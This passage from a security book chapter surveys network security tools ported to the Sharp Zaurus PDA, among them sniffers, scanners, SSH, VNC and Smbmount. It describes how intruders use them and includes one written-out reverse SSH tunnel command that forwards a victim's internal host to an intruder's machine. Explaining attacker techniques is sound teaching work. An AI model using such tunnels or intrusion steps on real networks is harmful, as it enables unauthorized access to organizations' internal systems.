- pgno: 232
  md: 'he Sharp Zaurus PDA (personal digital assistant) device runs an em-bedded version
    of the Linux operating system. The PDA has built-in support for various compact-flash
    802.11 network cards. These fea-tures, along with the PDA’s small form factor,
    make the Zaurus a powerful device. In this chapter, we will take a look at the
    many Linux security tools that have already been ported for the Zaurus architecture.
    Screenshots are presented wherever possible in order to satisfy your curiosity.


    # KISMET


    Kismet is a wireless network sniffer that can be used to capture and view information
    about wireless networks in an area. Intruders no longer need to lug around bulky
    laptops in order to discover wireless networks around an area. All that is needed
    is the Zaurus PDA, accompanied by the Kismet port available for download at **http://kismetwireless.net/code/**.
    Once you download, uncompress, and untar the tar.gz file avail-able from this
    URL, you will find an ipk package file in the kismet-arm directory that is created.
    Open this file using the File Manager in order to install Kismet, which looks
    like this when running on the PDA.


    ![](img/77287f6ef97ef0bed6e23f6610950d06_232_0.png)


    A GUI for Kismet is available at **http://sourceforge.net/projects/kismet-qt/**.'
  merge: -1
  img_proc: true
- pgno: 233
  md: '# # WELLENREITER II


    Wellenreiter is a wireless network monitor that can be used to detect and identify
    wireless networks in an area. Future versions of Wellenreiter will support WEP
    cracking and packet injection. Download Wellenreiter from http://opie.net.wox.org/wellenreiter/feed/.


    # # NMAP


    Once an intruder has gained access to a wireless network by using tools such as
    Kismet, he or she is likely to perform network scans against the network’s IP
    ranges in order to discover and enumerate hosts. Nmap is one of the most feature-rich
    port scanners available today. (Please see Chapter 2 for details on how to use
    Nmap to perform port scans using a variety of methods.) A Zaurus port of Nmap
    (shown next) is available from http://familiar.handhelds.org/familiar/releases/v0.7/base/armv4l/.


    ![](img/77287f6ef97ef0bed6e23f6610950d06_233_0.png)


    # # OPENMAPFE


    Openmapfe, a GUI front end to the Zaurus Nmap port shown in Figure 12-3, is available
    from http://home.midsouth.rr.com/zaurus/. This is a useful tool for those who
    are not familiar or comfortable with using Nmap’s command-line arguments.


    Qwenmapfe'
  merge: -1
  img_proc: true
- pgno: 234
  md: '![](img/77287f6ef97ef0bed6e23f6610950d06_234_0.png)


    # BING


    Bing, shown in the following dialog box, is a simple script that automates port
    scanning. When executed, it discovers live hosts on the current subnet by broadcasting
    ping requests. It then presents a list of hosts on the subnet that respond to
    ICMP echo requests. You can then pick a host from the given list to perform a
    port scan against (using Nmap). Download Bing’s package file from http://www.claustyckey.com/chad/bing_0.0.1_arm.ipk.


    ![](img/77287f6ef97ef0bed6e23f6610950d06_234_1.png)


    # OPENSSH


    The OpenSSH suite consists of free versions of clients supporting the SSHprotocol.
    It also includes a free version of an SSH server. The Zaurus'
  merge: -1
  img_proc: true
- pgno: 235
  md: 'port of OpenSSH can be found at http://killefiz.de/zaurus/showdetail.php?app=1035.


    An intruder may use the OpenSSH client to create a secure tunnel leading from
    an organization’s network to the comfort of his or her home. Consider the case
    where an intruder who has gained access to an organization’s wireless network
    launches the following command on his or her PDA:


    ```

    ssh -R 80:intranet.victimorgasanexample.com:8000 intruder@intruders_ip

    ```


    After the intruder issues this command and types in the password to his or her
    account, a secure tunnel will be established between the target organization’s
    network and the intruder’s host. Any connection on port 8000 on the intruder’s
    host will be redirected to port 80 of the victim organization’s internal host,
    intranet.victimorgasanexample.com, via the secure OpenSSH tunnel. Now, all the
    intruder must do is find a secure place to hide his or her Zaurus, and return
    to his or her home in order to exploit intranet.victimorgasanexample.com at his
    or her convenience!


    # # HPing2


    Hping2 is a tool used to send arbitrary network packets. It can be used by intruders
    to test firewall rule sets of an organization. The manual page for Hping2 is available
    online at http://www.hping.org/manpage.html. A Zaurus port is available from http://killefiz.de/zaurus/showdetail.php?app=902.


    The following illustration shows Hping2 in action. Notice that it is run with
    the -S flag, which sends SYN packets to the destination host on port 111. Since
    the destination host is listening on this port, it responds with a SYN+ACK packet,
    which is denoted by “flags=SA” in Hping2’s output.


    ![](img/77287f6ef97ef0bed6e23f6610950d06_235_0.png)'
  merge: -1
  img_proc: true
- pgno: 236
  md: '# # VNC SERVER


    VNC (Virtual Network Computing) is a remote-control software package that enables
    a user to access the desktop of another host. A Zaurus port for the VNC server
    is available from [http://sdgsystems.com/download.html](http://sdgsystems.com/download.html).
    Zaurus users may find the VNC server useful to access their PDAs remotely.


    On the other hand, since the Zaurus PDA can run various kinds of server software
    such as SSH, it is possible to attempt brute-force attacks on such services. Once
    an account on the PDA is compromised, an intruder may install the VNC server on
    the victim PDA in order to take control of the device (see Figure 12-1).


    ![](img/77287f6ef97ef0bed6e23f6610950d06_236_0.png)


    **Figure 12-1.** Using VNC to remote-control the Zaurus PDA'
  merge: -1
  img_proc: true
- pgno: 237
  md: '# KEYPEBBLE VNC VIEWER


    Very often, users incorrectly configure their VNC servers with weak or no passwords.
    An intruder who has gained access to an organization’s intranet can use a VNC
    viewer to connect to vulnerable VNC servers in order to take control of the misconfigured
    hosts (see the next illustration). One such viewer, the Keypebble VNC viewer,
    is available for the Sharp Zaurus PDA and can be downloaded from http://kilefiz.de/zaurus/showdetail.php?app=186.


    ![](img/77287f6ef97ef0bed6e23f6610950d06_237_0.png)


    # SMBMOUNT


    The Smbmount tool allows users to mount Samba network shares. Often, users misconfigure
    their Samba file shares with weak or no passwords. The Smbmount tool can be used
    by intruders to access such shares. (Please see Chapter 4 for details on Samba
    misconfigurations.) A Zaurus port for the Smbmount tool can be found at http://www.dasgehtdichnichtsan.de/zaurus/smbmount.html.


    # TCPDUMP


    Tcpdump is a popular network analyzer program that can be used to sniff sensitive
    data on a network segment (see the following illustration). Tcpdump and other
    network analyzer programs are also used by network administrators to perform troubleshooting.
    Tcpdump for the'
  merge: -1
  img_proc: true
- pgno: 238
  md: '# 184 Part III: Special Topics


    Zaurus can be downloaded from [http://www.sklogicsoftware.com/znetmeter/tcpdump_zaurus.html](http://www.sklogicsoftware.com/znetmeter/tcpdump_zaurus.html).


    ![](img/77287f6ef97ef0bed6e23f6610950d06_238_0.png)


    # WGET


    Wget is a tool used for downloading files using the HTTP, HTTPS, and FTP protocols.
    It has many useful features, including the ability to recursively download files
    from a web site. An intruder who has gained access to an organization’s wireless
    network can use Wget to quickly mirror the organization’s intranet web site. Wget
    is installed by default on the Zaurus.


    # ZETHEREAL


    ZEthereal is a port of the popular GUI network analyzer, Ethereal. ZEthereal binaries
    and screenshots can be obtained at [http://www.cartel-info.fr/pbiondi/zaurus/zether
    eal.html](http://www.cartel-info.fr/pbiondi/zaurus/zether eal.html). Detailed
    information and documentation about Ethereal can be found at [http://www.ethereal.com/](http://www.ethereal.com/).


    # ZNESSUS


    The zNessus tool is a Zaurus port of the Nessus GUI client. Screenshots and binaries
    are available at [http://znessus.sourceforge.net/](http://znessus.sourceforge.net/).
    zNessus can be used to remotely configure and launch vulnerability checks from'
  merge: -1
  img_proc: true
- pgno: 239
  md: 'a Nessus server. Please see Chapters 4 and 11 for more information on the Nessus
    scanner.


    > The zNessus client requires that the Nessus server be configured to support
    unencrypted communication (which is disabled by default). If you decide to disable
    encryption on your Nessus server, be sure to block all incoming traffic to your
    Nessus port (1241 by default). Use the OpenSSH client to connect to your Nessus
    server host in order to tunnel your zNessus traffic securely.


    # MTR


    MTR (Matt’s TraceRoute, shown in the next illustration) is a tool that combines
    the functionality of the ping and traceroute programs into a single program. (Please
    see Chapter 2 for more information on ping and traceroute.) The binary package
    for the MTR port for Zaurus can be downloaded from http://psifertex.com/zaurus/mtr_0.51_arm.ipk.


    ![](img/77287f6ef97ef0bed6e23f6610950d06_239_0.png)


    # DIG


    The dig tool can be used to interrogate DNS servers in order to fetch information
    such as MX records and server version information, as well as perform other DNS
    lookup queries. Dig for Zaurus is available at http://kilieferz.de/zaurus/showdetail.php?app=362.'
  merge: -1
  img_proc: true
- pgno: 240
  md: '# PERL


    Many security tools such as the Nikto and Whisker web vulnerability scanners are
    written using the Perl language. Since Perl is an interpreted language, there
    is no need to recompile already available Perl scripts in order to run them on
    the Zaurus. Perl for Zaurus is available at http://zaurus.frontgarden.net/perl.html.


    # ONLINE RESOURCES FOR THE Zaurus


    The Zaurus PDA has enjoyed tremendous fanfare among the Linux community. In addition
    to the tools discussed in this chapter, new ones are being created and ported
    every day. The resources in the following table provide links to software resources
    as well as FAQs and community forums.


    | Description | URL |

    | --- | --- |

    | Zaurus Software Index | http://killefiz.de/zaurus/ |

    | Zaurus DevNet Forums | http://www.zaurus.com/dev/board/ |

    | Zaurus Zone | http://www.zaurszone.com/ |

    | Sharp Developer | http://www.zaurus.com/dev/ |

    | Unofficial Sharp Zaurus SL-5500 FAQ | http://www.newbreedsoftware.com/zaurus-faq/
    |

    | ZaurusSoft software Database | http://www.zaurussoft.com/ |

    | OpenZaurus alternative ROMs | http://openzaurus.org/ |


    # SUMMARY


    In this chapter, you looked at the various security tools that can be used on
    the Zaurus PDA. Tools that perform wireless network discovery, network sniffing,
    and scanning are now available for the Zaurus. In addition, scripting languages
    such as Perl have been ported to the Zaurus, allowing users to run security tools
    built using the Perl language. The availability of such a huge library of security
    tools along with the flexibility of the Linux operating system makes the Zaurus
    PDA a powerful tool that can be used to perform attack and penetration engagements
    against target networks.'
  merge: -1
  img_proc: true
